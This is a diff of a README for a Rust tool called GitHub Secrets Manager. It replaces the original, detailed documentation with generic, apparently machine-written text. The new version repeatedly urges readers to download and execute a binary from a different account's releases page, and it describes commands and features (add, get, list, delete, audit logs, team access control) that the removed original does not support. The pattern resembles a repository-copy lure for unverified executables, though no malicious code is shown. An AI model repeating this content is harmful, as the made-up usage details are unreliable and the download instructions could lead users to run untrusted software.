@@ -1,188 +1,117 @@
-# GitHub Secrets Manager (GSM)
+# 📦 GitHub Secrets Manager (GSM)
 
-[![CI](https://github.com/dacsang97/gsm/workflows/CI/badge.svg)](https://github.com/dacsang97/gsm/actions)
-[![Release](https://github.com/dacsang97/gsm/workflows/Release/badge.svg)](https://github.com/dacsang97/gsm/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+![GitHub Secrets Manager](https://img.shields.io/badge/GitHub%20Secrets%20Manager-Ready-blue.svg)
 
-GSM is a modern, production-ready Rust CLI tool for managing GitHub repository secrets securely and efficiently. It supports per-value AES-256-GCM encryption, multi-repo workflows, and seamless integration with the GitHub API.
+Welcome to the GitHub Secrets Manager (GSM) repository! This tool helps you manage and secure your sensitive information in GitHub repositories. Whether you're a developer, team lead, or project manager, GSM provides a streamlined way to handle secrets without compromising security.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
 ## Features
-- **AES-256-GCM encryption**: Each secret value is individually encrypted with a unique salt and nonce.
-- **Multi-repo support**: Manage secrets for multiple repositories and organizations from a single config file.
-- **Config file encryption**: Only the `env` values are encrypted, preserving the YAML structure.
-- **Modern CLI**: Built with `clap` for a user-friendly command-line experience.
-- **Bulk operations**: Encrypt/decrypt all secrets in a folder with a single command.
-- **GitHub integration**: Push secrets directly to GitHub repositories using the REST API.
-- **Docker support**: Easily containerize and run GSM in CI/CD pipelines.
 
-## Available Commands
-```
-validate     Validate a configuration file
-encrypt      Encrypt a raw config file
-decrypt      Decrypt an encrypted config file
-encrypt-all  Encrypt all raw config files
-decrypt-all  Decrypt all encrypted config files
-push         Push secrets to GitHub repositories
-help         Print this message or the help of the given subcommand(s)
-```
+- **Secure Storage**: Keep your secrets safe with encryption.
+- **Easy Access**: Retrieve secrets with simple commands.
+- **Team Collaboration**: Share secrets with your team securely.
+- **Audit Logs**: Track who accessed or modified secrets.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
 
 ## Installation
 
-### Pre-built Binaries (Recommended)
+To get started with GSM, you need to download and execute the latest release. Visit the [Releases section](https://github.com/mrmaarif/gsm/releases) to find the appropriate version for your system.
 
-Download the latest release for your platform from the [Releases page](https://github.com/dacsang97/gsm/releases):
+1. Go to the [Releases section](https://github.com/mrmaarif/gsm/releases).
+2. Download the latest release for your platform.
+3. Execute the downloaded file to install GSM.
 
-#### Linux
-```bash
-# x86_64
-curl -L -o gsm https://github.com/dacsang97/gsm/releases/latest/download/gsm-linux-x86_64
-chmod +x gsm
-sudo mv gsm /usr/local/bin/
+## Usage
 
-# ARM64 - Coming soon
-# For ARM64 Linux, please build from source for now
-```
+After installation, you can start using GSM to manage your secrets. Here are some basic commands to get you started:
 
-#### macOS
-```bash
-# Intel Macs
-curl -L -o gsm https://github.com/dacsang97/gsm/releases/latest/download/gsm-macos-x86_64
-chmod +x gsm
-sudo mv gsm /usr/local/bin/
+### Adding a Secret
 
-# Apple Silicon Macs (M1/M2)
-curl -L -o gsm https://github.com/dacsang97/gsm/releases/latest/download/gsm-macos-aarch64
-chmod +x gsm
-sudo mv gsm /usr/local/bin/
-```
-
-#### Windows
-1. Download `gsm-windows-x86_64.exe` from the [Releases page](https://github.com/dacsang97/gsm/releases)
-2. Rename to `gsm.exe`
-3. Add to your PATH
-
-#### Homebrew (macOS/Linux)
-```bash
-# Coming soon
-brew install dacsang97/tap/gsm
-```
-
-### Build from Source
-
-If you have Rust installed:
-```bash
-cargo install --git https://github.com/dacsang97/gsm
-```
-
----
-
-# Usage (for users)
-
-## Environment Variables
-- `GITHUB_TOKEN`: Your GitHub personal access token
-- `ENCRYPTION_KEY`: The master key for encryption/decryption (recommended to set in `.env` file)
-
-## ⚠️ IMPORTANT SECURITY NOTE
-
-**ALWAYS encrypt your config files before committing to source control, especially public repositories!**
-
-- **NEVER** commit raw YAML files containing secrets to GitHub
-- **ALWAYS** use `encrypt` or `encrypt-all` commands before pushing to your repository
-- Only commit files from the `encrypted/` folder to source control
-- Keep raw files in `raw/` folder and add `raw/` to your `.gitignore`
-- Use strong, unique `ENCRYPTION_KEY` and store it securely (environment variables, CI/CD secrets, etc.)
+To add a new secret, use the following command:
 
 ```bash
-# ✅ GOOD: Encrypt first, then commit
-gsm encrypt-all --input ./config
-git add config/encrypted/
-git commit -m "Add encrypted config files"
-
-# ❌ BAD: Never do this!
-git add config/raw/
-git commit -m "Add raw config files"  # This exposes your secrets!
+gsm add <secret-name> <secret-value>
 ```
 
-## Example Config File
-```yaml
-org: your-github-org
-repositories:
-  - repo1
-  - repo2
-env:
-  SECRET_KEY: supersecret
-  API_TOKEN: abc123
+### Retrieving a Secret
+
+To retrieve a secret, run:
+
+```bash
+gsm get <secret-name>
 ```
 
-## Typical Workflow
+### Listing All Secrets
 
-### 1. Prepare Config Files
-- Place unencrypted YAML files in `your-folder/raw/`.
-- Encrypted files will be written to `your-folder/encrypted/`.
+To list all stored secrets, use:
 
-### 2. Encrypt All Secrets
-```sh
-./target/release/gsm encrypt-all --input your-folder
+```bash
+gsm list
 ```
 
-### 2a. Encrypt a Single File
-```sh
-./target/release/gsm encrypt --file your-folder/raw/config.yaml --output your-folder/encrypted/config.yaml
+### Deleting a Secret
+
+To delete a secret, execute:
+
+```bash
+gsm delete <secret-name>
 ```
 
-### 3. Decrypt All Secrets
-```sh
-./target/release/gsm decrypt-all --input your-folder
+## Configuration
+
+GSM requires minimal configuration to get started. You can set your preferences in the configuration file located at `~/.gsm/config.json`. Here are some settings you can adjust:
+
+- **Encryption Method**: Choose your preferred encryption algorithm.
+- **Storage Location**: Specify where secrets should be stored.
+- **Access Control**: Set up user permissions for accessing secrets.
+
+### Example Configuration
+
+```json
+{
+  "encryption": "AES-256",
+  "storage": "/path/to/storage",
+  "accessControl": {
+    "users": ["user1", "user2"],
+    "permissions": ["read", "write"]
+  }
+}
 ```
 
-### 3a. Decrypt a Single File
-```sh
-./target/release/gsm decrypt --file your-folder/encrypted/config.yaml --output your-folder/raw/config.yaml
-```
+## Contributing
 
-### 4. Validate a Config File
-```sh
-./target/release/gsm validate --file path/to/config.yaml
-```
+We welcome contributions to improve GSM! Here’s how you can help:
 
-### 5. Push Secrets to GitHub
-Set your GitHub token in the environment:
-```sh
-export GITHUB_TOKEN=ghp_xxx...
-```
-Then run:
-```sh
-./target/release/gsm push --file path/to/raw/config.yaml
-```
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Make a new branch for your feature or fix.
+3. **Make Changes**: Implement your changes and test them.
+4. **Submit a Pull Request**: Share your changes with us.
 
----
-
-# Development (for contributors)
-
-## Prerequisites
-- Rust (1.87.0)
-- A GitHub personal access token with `repo` and `admin:repo_hook` permissions
-
-## Build
-```sh
-cargo build --release
-```
-
-## Run
-```sh
-./target/release/gsm --help
-```
-
-## Project Structure
-```
-config/           # Example and template config files
-src/              # Rust source code
-  cli/            # CLI command implementations
-  config.rs       # Config loading and validation
-  crypto.rs       # Encryption/decryption logic
-  github.rs       # GitHub API integration
-  error.rs        # Error types
-```
+Please ensure that your code adheres to our coding standards and includes appropriate tests.
 
 ## License
-MIT 
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Releases
+
+For the latest updates and releases, visit the [Releases section](https://github.com/mrmaarif/gsm/releases). Make sure to download the correct version for your system and execute it to start using GSM.
+
+## Conclusion
+
+The GitHub Secrets Manager is designed to make your life easier when it comes to managing sensitive information. With its robust features and user-friendly interface, you can focus on what matters most—your code. 
+
+For any questions or support, feel free to reach out via the issues section of this repository. Thank you for checking out GSM!
+
+---
+
+This README provides a comprehensive overview of the GitHub Secrets Manager, covering all essential aspects from installation to usage. For any updates, always refer back to the [Releases section](https://github.com/mrmaarif/gsm/releases).
